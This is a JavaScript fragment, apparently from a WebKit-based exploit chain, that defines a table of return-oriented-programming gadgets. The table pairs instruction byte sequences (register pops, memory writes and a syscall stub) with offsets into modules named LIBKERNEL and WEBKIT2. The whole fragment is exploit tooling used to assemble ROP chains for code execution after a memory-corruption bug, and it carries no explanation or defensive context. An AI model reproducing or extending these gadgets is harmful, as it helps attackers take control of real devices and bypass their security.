

var gadgets = {
    "pop rbp": new gadget([0x5d], LIBKERNEL, 0x652),
    "pop rax": new gadget([0x58], LIBKERNEL, 0x2ce3c),
    "pop rcx": new gadget([0x59], WEBKIT2, 0x3d629),
    "pop rdx": new gadget([0x5a], WEBKIT2, 0x1A3DB2), 
    "pop rsi": new gadget([0x5e], WEBKIT2, 0x2a3925),
    "pop rdi": new gadget([0x5f], WEBKIT2, 0x1a7fcb),
    "pop r8": new gadget([0x41, 0x58], WEBKIT2, 0xb82cd),
    "pop r9": new gadget([0x43, 0x59], WEBKIT2, 0x3bef4f),
    "pop rsp": new gadget([0xf3, 0x5c], WEBKIT2, 0x5fb25),
    
    "mov r10, rcx; syscall": new gadget([0x49, 0x89, 0xca, 0x0f, 0x05], LIBKERNEL, 0x457),
        
    "mov [rax+0x60], rdi": new gadget([0x48, 0x89, 0x78, 0x60], WEBKIT2, 0x2B6304),

    "mov [rsi+0x18], rax": new gadget([0x48, 0x89, 0x46, 0x18], WEBKIT2, 0x46ec5)
}
